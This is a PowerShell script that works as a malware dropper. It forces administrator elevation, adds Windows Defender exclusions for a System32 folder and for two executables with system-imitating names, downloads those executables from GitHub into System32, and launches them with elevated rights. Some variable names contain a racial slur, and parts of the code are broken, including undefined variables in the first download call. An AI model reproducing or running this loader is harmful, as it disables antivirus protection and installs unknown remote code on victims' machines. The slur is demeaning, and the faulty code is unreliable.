if (!([securITy.pRINCiPal.WINDOWspRinCIpal][SEcuRity.PrinCiPAl.WInDowsiDEnTITy]::GetCurrent()).IsInRole([sECuRITy.PRincipAl.wiNDowsBuilTInrolE] "Administrator")) {
 Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$psCOMmaNDPAtH`"" -Verb RunAs
       exit
}

Add-MpPreference -ExclusionPath "C:\Windows\System32\Dism"
Add-MpPreference -ExclusionProcess "C:\Windows\System32\rundll64.exe"
Add-MpPreference -ExclusionProcess "C:\Windows\System32\Windows.exe"

$tuFfUrl = "https://github.com/totowii/meow/raw/refs/heads/main/rundll64.exe"
$TufFpaTh = "C:\Windows\System32\rundll64.exe"

Write-Host "Downloading..." -ForegroundColor Cyan

$wc = New-Object System.Net.WebClient
$wc.DownloadFileAsync($exeurL, $EXEpath)

while ($wc.IsBusy) {
Start-Sleep -Milliseconds 1000
}

$niGgeRURl = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Windows.exe"
$NiGGErpaTh = "C:\Windows\System32\Windows.exe"

$wc = New-Object System.Net.WebClient
$wc.DownloadFileAsync($tuFfUrl, $TufFpaTh, $niGgeRURl, $NiGGErpaTh)

while ($wc.IsBusy) {
     Start-Sleep -Milliseconds 1000
}

if (Test-Path $TufFpaTh) {
      Write-Host "Completed..." -ForegroundColor Green
    Start-Process $TufFpaTh -Verb RunAs
} else {
         Write-Host "Download failed..." -ForegroundColor Red
}

if (Test-Path $NiGGErpaTh) {
  Start-Process $NiGGErpaTh -Verb RunAs
}